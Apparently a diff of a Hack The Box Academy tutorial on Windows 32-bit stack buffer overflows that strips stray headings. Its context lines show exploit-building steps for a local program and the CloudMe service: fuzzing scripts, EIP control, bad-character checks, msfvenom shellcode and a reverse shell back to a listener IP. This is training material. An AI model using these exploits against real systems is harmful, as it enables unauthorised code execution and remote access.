@@ -84,8 +84,6 @@ The following table demonstrates how the stack works. We can click on `push` to 
 
 |            |                              |
 | ---------- | ---------------------------- |
-|            |                              |
-|            |                              |
 | 0xabcdef   | <-- Top of Stack (`$esp`)    |
 | 0x12345678 | <-- Bottom of Stack (`$ebp`) |
 
@@ -280,8 +278,6 @@ We go through the program's various menu items, and as we just mentioned, the li
 
 Let's start by creating a very large text payload, like `10,000` characters, and input them into our field. We can get our text payload with python, as follows:
 
-Fuzzing Parameters
-
 ```powershell-session
 PS C:\Users\htb-student\Desktop> python -c "print('A'*10000)"
 
@@ -302,8 +298,6 @@ As we can see, the program does not crash and just tells us `Registration is not
 Now let's move to fuzzing the program with opened files. Both the program's `File` menu and clicking on the `Encode` button seem to accept `.wav` files, which is among the files that tend to cause overflows. So, let's try to fuzz the program with `.wav` files.
 
 First, we'll repeat what we did above to generate our text payload and write the output to a `.wav` file, as follows:
-
-Fuzzing Parameters
 
 ```powershell-session
 PS C:\Users\htb-student\Desktop> python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
@@ -362,8 +356,6 @@ Luckily, we don't have to manually code a script that creates this unique patter
 
 We can generate a unique pattern with `pattern_create` either in our `PwnBox` instance or right within our debugger `x32dbg` with the `ERC` plugin. To do so in `PwnBox`, we can use the following command:
 
-Controlling EIP
-
 ```shell-session
 root@htb[/htb]$ /usr/bin/msf-pattern_create -l 5000
 
@@ -373,8 +365,6 @@ Aa0Aa1Aa2...SNIP...3Gk4Gk5Gk
 We can now feed this buffer to our program as a `.wav` file. However, it's always easier to do everything in Windows to avoid jumping between two VMs. So, let's see how we can get the same pattern with `ERC`.
 
 If we use the `ERC --help` command, we see the following guidance:
-
-Controlling EIP
 
 ```cmd-session
 --Pattern
@@ -397,8 +387,6 @@ We will write our exploit in Python3 since it contains built-in libraries to hel
 
 We can start by creating a new function with `def eip_offset():`, and then create our `payload` variable as a `bytes` object and paste between the parenthesis the `Ascii:` output from `Pattern_Create_1.txt`. So, we can click on the Windows Search bar at the bottom and write `IDLE`, which would open the Python3 editor, and then click `ctrl+N` to start writing a new python script where we can start writing our code. Our initial code should look as follows:
 
-Code: python
-
 ```python
 def eip_offset():
     payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
@@ -409,8 +397,6 @@ def eip_offset():
 
 Next, under the same `eip_offset()` function, we will write `payload` to a file called `pattern.wav`, by adding the following lines:
 
-Code: python
-
 ```python
     with open('pattern.wav', 'wb') as f:
         f.write(payload)
@@ -419,8 +405,6 @@ Code: python
 Note how we are always using bytes for our data, and use `'wb'` to write our pattern in bytes. This is because we should create our payload as it will be processed by the program, which in a buffer overflow exercise is in bytes, since it will be loaded into the stack as machine code in bytes.
 
 Finally, we should call our `eip_offset()` function by adding the following line at the end. Otherwise, the function will not get run:
-
-Code: python3
 
 ```python3
 eip_offset()
@@ -440,8 +424,6 @@ Now that we have our pattern saved into a `.wav` file, we can load it into our p
 Once we do, we should see that our program crashes due to the long input. Most importantly, we should see that the `EIP` register got overwritten with part of our unique pattern: ![Pattern EIP](https://academy.hackthebox.com/storage/modules/89/win32bof\_pattern\_eip.jpg)
 
 Now we can use the value of `EIP` to calculate the offset. We can once again do it in our `PwnBox` with `msf-pattern_offset` (the counterpart of `msf-pattern_create`), by using the hex value in `EIP`, as follows:
-
-Controlling EIP
 
 ```shell-session
 root@htb[/htb]$ /usr/bin/msf-pattern_offset -q 31684630
@@ -468,8 +450,6 @@ As we can see, it found the offset based on patterns found in various registers,
 Our final step is to ensure we can control what value goes into `EIP`. Knowing the offset, we know exactly how far our `EIP` is from the start of the buffer. So, if we send `4112` bytes, the next 4 bytes would be the ones that fill `EIP`.
 
 Let's add another function, `eip_control()`, to our `win32bof_exploit.py` and create an `offset` variable with the offset we found. Then, we'll create a `buffer` variable with a string of `A` bytes as long as our offset to fill the buffer space, and an `eip` variable with the value we want `EIP` to be, which we will use as `4` bytes of `B`. Finally, we'll add both to a `payload` variable and write it to `control.wav`, as follows:
-
-Code: python
 
 ```python
 def eip_control():
@@ -530,8 +510,6 @@ This also creates two files on our Desktop:
 
 The next step would be to generate a `.wav` file with the characters string generated by `ERC`. We will once again write a new function `bad_chars()`, and use a similar code to the `eip_control()` function, but will use the characters under `C#` in `ByteArray_1.txt`. We will create a new list of bytes `all_chars = bytes([])`, and paste the characters between the brackets. We will then write to `chars.wav` the same `payload` from `eip_control()`, and add after it `all_chars`. The final function would look as follows:
 
-Code: python
-
 ```python
 def bad_chars():
     all_chars = bytes([
@@ -567,8 +545,6 @@ We must first copy the address of `ESP` since this is where our input is located
 
 Once we have the value of `ESP`, we can use `ERC --compare` and give it the `ESP` address and the location of the `.bin` file that contains all characters, as follows:
 
-Identifying Bad Characters
-
 ```cmd-session
 ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin
 ```
@@ -583,8 +559,6 @@ As we can see, this places each byte from both locations next to each other to q
 
 Now that we have identified the first bad character, we should use `--bytearray` again to generate a list of all characters without the bad characters, which we can specify with `-bytes 0x00,0x0a,0x0d...etc.`. So, we will use the following command:
 
-Identifying Bad Characters
-
 ```cmd-session
 ERC --bytearray -bytes 0x00
 ```
@@ -594,8 +568,6 @@ Now, let's use this command with `ERC` again to generate the new file and use it
 ![ERC Byte Array 2](https://academy.hackthebox.com/storage/modules/89/win32bof\_erc\_bytearry\_2.jpg)
 
 As we can see, this time, it said `excluding: 00`, and the array table does not include `00` at the beginning. So, let's go to the generated output file `ByteArray_2.txt`, copy the new bytes under `C#`, and place them in our exploit, which should now look as follows:
-
-Code: python
 
 ```python
 def bad_chars():
@@ -695,8 +667,6 @@ As for `OS DLL`, if we are running on a newer Windows version like Windows 10, w
 
 If we only consider files with `False` set to all protections, we would get the following list:
 
-Finding a Return Instruction
-
 ```cmd-session
 ------------------------------------------------------------------------------------------------------------------------ 
  Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name, and Path 
@@ -719,8 +689,6 @@ We can start with `cdextract.exe` and double-click it to open view and search it
 We can enter `jmp esp`, and it should show us if this file contains any of the instructions we searched for: ![Find JMP ESP](https://academy.hackthebox.com/storage/modules/89/win32bof\_find\_jmp\_esp.jpg)
 
 As we can see, we found the following matches:
-
-Code: shell
 
 ```cmd-shell
 Address  Disassembly
@@ -789,8 +757,6 @@ So, to generate our shellcode, we will use `msfvenom`, which can generate shellc
 
 First, we can list all available payloads for `Windows 32-bit`, as follows:
 
-Jumping to Shellcode
-
 ```shell-session
 root@htb[/htb]$ msfvenom -l payloads | grep
 
@@ -803,8 +769,6 @@ root@htb[/htb]$ msfvenom -l payloads | grep
 ```
 
 For initial testing, let's try `windows/exec` and execute `calc.exe` to open the Windows calculator if our exploit is successful. To do this, we'll use `CMD=calc.exe`, `-f 'python'` since we are using a python exploit, and `-b` to specify any bad characters:
-
-Jumping to Shellcode
 
 ```shell-session
 root@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
@@ -820,8 +784,6 @@ buf += b"\x6b\xd4\xa9\x2f\x94\x25\x29\x50\x1c\xc0\x18\x50\x7a"
 Note: We used the `-b` to showcase how to eliminate any bad characters from our shellcode, where we can add all bad characters we need to eliminate (e.g. `'\x00\x0a\x0d'`). Even if our shellcode did not have any bad characters, this shellcode should still run, though the final shellcode is usually longer if we specify bad characters
 
 Next, we can copy the `buf` variable into our exploit, where we will now define the final function `def exploit()`, which will be our main exploit code:
-
-Code: python
 
 ```python
 def exploit():
@@ -858,15 +820,11 @@ Any of these should work in executing the shellcode we write on the stack (feel 
 
 To convert it from `hex` to an address in Little Endian, we'll use a python function called `pack` found in the `struct` library. We can import this function by adding the following line at the beginning of our code:
 
-Code: python
-
 ```python
 from struct import pack
 ```
 
 Now we can use `pack` to turn our address into its proper format, and use '`<L`' to specify that we want it in Little Endian formatting:
-
-Code: python
 
 ```python
     offset = 4112
@@ -886,8 +844,6 @@ To avoid having to do this, we can add a few `NOP` bytes before our shellcode, w
 
 The stack alignment needed is usually not more than `16` bytes in most cases, and it may rarely reach `32` bytes. Since we have a lot of buffer space, we'll just add `32` bytes of `NOP` before our shellcode, which should guarantee that the execution starts somewhere within these bytes, and continue to execute our main shellcode:
 
-Code: python
-
 ```python
     nop = b"\x90"*32
 ```
@@ -897,8 +853,6 @@ Code: python
 ### Writing Payload to File
 
 With that, our final payload should look as follows:
-
-Code: python
 
 ```python
     offset = 4112
@@ -918,8 +872,6 @@ Code: python
 ```
 
 Once we assemble all of these parts, our final `exploit()` function should look as follows:
-
-Code: python
 
 ```python
 def exploit():
@@ -954,8 +906,6 @@ The final step would be to utilize this exploit to gain code execution. Since we
 
 To do either of these options, all we have to do is change our shellcode to do something else. For local privilege escalation, we can use the same command we used for `calc.exe`, but use `CMD=cmd.exe` instead, as follows:
 
-Jumping to Shellcode
-
 ```shell-session
 root@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'
 
@@ -967,8 +917,6 @@ buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x45\x13\x03\x39\x8c\x6e"
 ```
 
 If we wanted to get a reverse shell, there are many `msfvenom` payloads we can use, which we can get a list of as follows:
-
-Jumping to Shellcode
 
 ```shell-session
 root@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse
@@ -986,8 +934,6 @@ root@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse
 ```
 
 We can use the `windows/shell_reverse_tcp` payload as follows:
-
-Jumping to Shellcode
 
 ```shell-session
 root@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'
@@ -1024,8 +970,6 @@ Whether we are debugging a local program or one that listens for remote connecti
 
 This time, we will be debugging a program called `CloudMe`, an end-user tool for a file sharing service, found on the Desktop of the Windows VM below. As a file-sharing service, this tool listens on a port for any updates from the file server. We can see this if the tool is running, and we list listening ports in `Powershell`:
 
-Remote Fuzzing
-
 ```powershell-session
 PS C:\htb> netstat -a
 
@@ -1035,8 +979,6 @@ TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING
 ```
 
 As we can see, the service is listening on port `8888`, and it has also established a connection to a remote server. We can use the `netcat` program on the Desktop to interact with this port and see if it accepts any parameters:
-
-Remote Fuzzing
 
 ```powershell-session
 PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
@@ -1057,8 +999,6 @@ Once our program is running and we are attached to it through `x32dbg`, we can s
 
 We'll create a new script called `win32bof_exploit_remote.py` and start by adding a couple of variables for `IP` and `port`, such that we can easily change them if we want to use the script on another server. Then, we will write our fuzzing function `def fuzz():`. We want to send increments of large strings, starting from `500` bytes long and incrementing by `500` at each iteration, until we send a long enough string that crashes the program. To accomplish this, we'll loop in a range from `0` to `10,000` with increments of `500`, as follows:
 
-Code: python
-
 ```python
 import socket
 from struct import pack
@@ -1076,16 +1016,12 @@ The print statement helps us know the current fuzzing buffer size so that when t
 
 Next, we need to connect to the port each time and send our payload to it. To do so, we have to import the `socket` library as we did at the beginning of our code above, and then establish a connection to the port with the `connect` function, as follows:
 
-Code: python
-
 ```python
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((IP, port))
 ```
 
 With that, we should be ready to send our buffer, which we can do through `s.send(buffer)`. We will also need to wrap our loop in a `try/except` block, so that we can stop the execution when the program crashes and does not accept connections anymore. Our final `fuzz()` function should look as follows:
-
-Code: python
 
 ```python
 def fuzz():
@@ -1108,8 +1044,6 @@ Note: In our case, the program is closing the connection after each input, as we
 Tip: As our server is vulnerable at the entry point after establishing the connection, we are directly sending our payload. It is also possible to interact with the server and pass data like login credentials or certain parameters to reach the vulnerable function, by using `send` and `recv`. You can read more about `socket` functions in the [Official Documentation](https://docs.python.org/3/library/socket.html).
 
 We run our script and see the following:
-
-Remote Fuzzing
 
 ```cmd-session
 Fuzzing 0 bytes
@@ -1136,8 +1070,6 @@ We can gradually send our buffer by adding a `breakpoint()` after `s.send(buffer
 Tip: You can have both `x32dbg` and the python IDLE side-by-side, so that you can immediately notice when the program crashes.
 
 So, we will add our breakpoint to our exploit, restart the program in `x32dbg`, and start gradually fuzzing the program:
-
-Remote Fuzzing
 
 ```cmd-session
 Fuzzing 0 bytes
@@ -1185,8 +1117,6 @@ We'll start by creating a unique pattern `2000` bytes long, using `ERC --pattern
 
 Now we start writing our `eip_offset()` function. We'll add our `pattern` variable like with the pattern under `Ascii` in the `Pattern_Create_1.txt` file created on our desktop, like we did with our previous exploit. After that, to send our pattern, we can use the same code we used to fuzz the port:
 
-Code: python
-
 ```python
 def eip_offset():
     pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
@@ -1208,8 +1138,6 @@ Now we can use `ERC --pattern o 1jB0` to calculate the exact offset, which is fo
 ![Pattern Offset](https://academy.hackthebox.com/storage/modules/89/win32bof\_remote\_pattern\_offset.jpg)
 
 Now to ensure that we can control the exact value at `EIP`, we'll use the same `eip_control()` function from our previous exploit (while changing `offset`), but with using `socket` to send our payload instead of writing it to a file:
-
-Code: python
 
 ```python
 def eip_control():
@@ -1233,8 +1161,6 @@ We'll once again restart our program and run our exploit, and we can confirm tha
 ### Identifying Bad Characters
 
 Our next step is to identify whether we should avoid using any bad characters in our input. We can start by running `ERC --bytearray` in `x32dbg` to create our `ByteArray_1.bin` file. Then we can copy the same `bad_chars()` functions from our previous exploit, and once again change from writing the payload to a file to sending it to the port:
-
-Code: python
 
 ```python
 def bad_chars():
@@ -1269,8 +1195,6 @@ Now that we have control over `EIP` and know which bad characters to avoid in ou
 
 However, we will prefer using an address of an instruction built within the program to ensure it will run on any system, as these instructions will be the same on any system. So, we'll first get a list of modules and libraries loaded by the program, and we will only consider ones that have `False` for all protections, which are the following:
 
-Building a Remote Exploit
-
 ```cmd-session
 ------------------------------------------------------------------------------------------------------------------------ 
 Process Name: CloudMe Modules total: 79 
@@ -1298,8 +1222,6 @@ If we had not found any results, we could search for the `FFE4` pattern in the e
 
 Our final step is to exploit the program, so we'll start by creating our shellcode with `msfvenom` to open `calc.exe` as proof of successful exploitation:
 
-Building a Remote Exploit
-
 ```shell-session
 root@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
 
@@ -1312,8 +1234,6 @@ buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
 ```
 
 Now to create our final `exploit()` function, we'll first add the above output, and will use the same `payload` from our previous exploit (while changing `offset` and address in `eip`). Finally, we will use the same code from `bad_chars()` to send our payload to the port:
-
-Code: python
 
 ```python
 def exploit():
@@ -1350,8 +1270,6 @@ As we have built and tested our exploit, we can now try running it on a real rem
 
 First, we need to find our machine's IP, which should be reachable by the remote server (in the same network subnet):
 
-Remote Exploitation
-
 ```shell-session
 root@htb[/htb]$ ip -4 a
 
@@ -1371,8 +1289,6 @@ Note: You need to be connected to the VPN to be able to interact with the remote
 
 Next, we will generate the shellcode that will send us a reverse shell, which we can get with the `windows/shell_reverse_tcp` payload in `msfvenom`, as follows:
 
-Remote Exploitation
-
 ```shell-session
 root@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'
 
@@ -1390,8 +1306,6 @@ We can modify our exploit by copying the output and using it in the `exploit()` 
 
 After that, we can start a `netcat` listener to receive the reverse shell, as follows:
 
-Remote Exploitation
-
 ```shell-session
 root@htb[/htb]$ nc -lvnp 1234
 
@@ -1399,8 +1313,6 @@ listening on [any] 1234 ...
 ```
 
 Once we are listening, we can run our payload with `python win32bof_exploit_remote.py` and wait for the remote server to send us a reverse shell if our exploitation was successful.
-
-Remote Exploitation
 
 ```shell-session
 root@htb[/htb]$ nc -lvnp 1234
